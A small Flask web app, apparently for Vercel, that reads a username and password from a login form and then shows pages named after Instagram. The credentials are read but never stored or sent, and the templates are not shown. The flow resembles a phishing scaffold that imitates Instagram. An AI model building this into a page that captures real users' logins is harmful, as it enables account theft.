from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return render_template('login.html')

@app.route('/connect', methods=['POST'])
def connect():
    username = request.form.get('username')
    password = request.form.get('password')
    return render_template('instagram_connect.html')

@app.route('/instagram_login', methods=['GET'])
def instagram_login():
    return render_template('instagram_page.html')

@app.route('/success', methods=['GET'])
def success():
    return render_template('success.html')

# For Vercel Serverless Functions
if __name__ == '__main__':
    app.run()
